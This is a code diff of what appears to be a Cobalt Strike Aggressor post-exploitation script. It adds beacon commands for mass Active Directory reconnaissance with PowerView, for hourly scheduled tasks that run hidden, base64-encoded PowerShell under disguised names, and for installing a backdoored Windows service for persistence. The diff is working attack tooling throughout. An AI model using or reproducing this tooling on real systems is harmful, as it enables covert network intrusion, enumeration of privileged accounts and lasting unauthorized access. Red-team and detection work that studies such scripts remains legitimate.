@@ -264,13 +264,52 @@ alias get_domainShares {
         berror($1, "Invalid Parameters!");
         return;
     }
-    bpowerpick($1, $command);
+    #import the script
+    $handle = openf($POWERLURK_PATH);
+    $script = readb($handle, -1);
+    closef($handle);
+
+    #send script to beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    bpowerpick($1, $command, $oneliner);
 }
 beacon_command_register (
     "get_domainShares",
     "Uses PowerView to find Domain Shares and check perms",
     "Uses PowerView to find Domain Shares and check perms\n\n"
     . "Usage: get_domainShares (domain)"
+)
+alias get_domainmassrecon {
+    bpowershell_import($1, $POWERVIEW_PATH);
+
+    @commands = @(
+    'Get-Domain',
+    'Get-DomainController | select Forest, Name, OSVersion | fl',
+    'Get-ForestDomain',
+    'Get-DomainPolicyData | select -expand SystemAccess',
+    'Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName',
+    'Get-DomainOU -Properties Name | sort -Property Name',
+    'Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName',
+    'Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName',
+    'Get-DomainGPO -Properties DisplayName | sort -Property DisplayName',
+    'Get-DomainGPOLocalGroup | select GPODisplayName, GroupName',
+    'Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl',
+    'Get-DomainTrust',
+    'Get-DomainUser -Properties DisplayName, MemberOf | fl'
+    );
+
+    foreach $index => $value (@commands) {
+        btask($1, $value);
+        bpowerpick($1, $value);
+    }
+
+}
+beacon_command_register (
+    "get_domainrecon",
+    "Uses PowerView to find Domain information",
+    "Uses PowerView to find Domain information\n\n"
+    . "Usage: get_domainrecon"
 )
 #KERBEROASTING
 ##FIND TARGETS
@@ -455,23 +494,26 @@ beacon_command_register (
 )
 
 #PERSISTANCE METHODS
-## SCHEDULED TASKS
+## SCHEDULED TASK
 alias persist_schtask {
+    $size = size(@_);
     $rand = rand_alphanum(4);
 
-    if ( $2 ismatch 'psh') {
+    if ( $size == 3 && $2 ismatch 'psh') {
         blog($1, "Executing Powershell Persistance");
         $b64payload = $3;
         
-        $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
-        $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
-        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
-    } else if ( $2 ismatch 'local' ) {
+        $parameters = 
+        '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
+        . ' -a "-nop -w hidden -enc ' . $b64payload. '"'
+        . ' -n "BlaiseBits-' . $rand . '" -m add -o hourly';
+    } else if ( $size == 3 && $2 ismatch 'local' ) {
         blog($1, "Executing Local Binary Persistance");
         $payload = $3;
 
-        $parameters = '-t schtask -c "' . $payload . '"';
-        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
+        $parameters = 
+        '-t schtask -c "' . $payload . '"'
+        . ' -n "BlaiseBits-' . $rand . '" -m add -o hourly';
     } else {
         berror($1, "Invalid Parameter.");
         return;
@@ -487,6 +529,35 @@ beacon_command_register(
     . "or a path to an executable to run hourly\n\n"
     . "Usage:\npersist_schtask psh [base64]\n"
     . "persist_schtask local [path] "
+);
+## WINDOWS SERVICE
+alias persist_service {
+    $size = size(@_);
+    $rand = rand_alphanum(4);
+
+    if ( $size == 2 && -isadmin $1) {
+        blog($1, "Executing Local Binary Persistance");
+        $payload = @_[1];
+
+        $parameters =
+        '-t service -c "' . $payload . '"'
+        . ' -n "Updater-' . $rand . '"'
+        . ' -m add';
+    } else {
+        berror($1, "Invalid Parameter or not running as admin.");
+        return;
+    }
+
+    bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
+}
+beacon_command_register(
+    "persist_service",
+    "Does persistance stuff",
+    "Install a backdoored service\n"
+    . "Takes a path to an executable to run on boot\n\n"
+    . "Usage:\n"
+    . "  persist_service [payload path]"
+    . "\n"
 );
 
 ##WMI EVENTS
